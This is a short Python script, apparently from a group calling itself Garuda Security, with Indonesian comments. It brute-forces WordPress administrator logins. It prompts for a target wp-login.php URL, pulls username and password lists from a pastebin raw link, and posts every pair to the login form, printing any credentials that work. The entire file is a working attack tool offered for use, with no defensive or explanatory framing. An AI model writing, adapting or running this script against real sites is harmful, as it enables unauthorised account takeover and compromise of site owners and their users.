import requests
import os
import sys

# Clear screen command based on the operating system
os.system('cls' if os.name == 'nt' else 'clear')

print("""
                 \033[35mCode By Garuda Security - SukaJanda01
        \033[37mmasukan url dengan https://example.com/wp-login.php
""")

target = input("Masukan target url: ")

username_api_url = "https://pastebin.com/raw/X3b9Vu5d"
password_api_url = "https://pastebin.com/raw/X3b9Vu5d"

# Cek Apakah Username dan Password Benar
def check_credentials(session, url, username, password):
    payload = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": f"{target}/wp-admin",
        "testcookie": "1"
    }
    response = session.post(url, data=payload)
    return "wp-admin" in response.url or "wordpress" in response.url

# Dapatkan Username dan Password dari API
def get_credentials(api_url):
    response = requests.get(api_url)
    return response.text.strip()

# Main
if __name__ == "__main__":
    session = requests.Session()

    username_list = get_credentials(username_api_url).split('\n')
    password_list = get_credentials(password_api_url).split('\n')

    if not username_list or not password_list:
        print("Gagal mendapatkan username atau password dari API")
        sys.exit(1)

    success = False

    for username in username_list:
        for password in password_list:
            if check_credentials(session, target, username, password):
                print(f"Berhasil melakukan brute force: username = {username}, password = {password}")
                success = True
                break
            else:
                print(f"Gagal login dengan akun: {username}:{password}")

    if not success:
        print("Gagal melakukan brute force")
